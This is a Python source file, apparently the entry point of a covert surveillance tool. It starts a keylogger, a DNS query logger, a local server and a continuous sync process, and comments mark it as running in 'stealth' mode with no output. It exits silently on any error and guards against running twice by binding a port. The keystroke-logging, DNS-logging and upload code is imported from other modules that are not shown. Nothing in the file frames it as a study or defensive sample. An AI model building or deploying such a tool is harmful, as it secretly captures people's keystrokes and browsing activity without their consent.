from logger import key_logger, dns_logger
from utilities import dir_path, sync, server
import multiprocessing
import socket
import sys


def create_processes(choice):
    """Return a list of processes based on the user's menu choice."""
    proc = []
    if choice == 1:
        proc = [
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
        ]
    elif choice == 2:
        proc = [
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
        ]
    elif choice == 3:
        proc = [
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
        ]
    elif choice == 4:
        proc = [
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
        ]
    elif choice == 5:
        proc = [
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
        ]
    elif choice == 6:
        proc = [
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
        ]
    return proc


def main():
    # Prevent multiple instances (stealth: no output)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(("", 9903))
    except socket.error:
        sys.exit()

    try:
        dir_path()
        # Always start all loggers and sync in stealth mode
        processes = [
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
        ]
        for p in processes:
            p.start()
        for p in processes:
            p.join()
    except Exception:
        sys.exit(1)


if __name__ == "__main__":
    multiprocessing.freeze_support()
    try:
        main()
    except Exception:
        sys.exit(0)
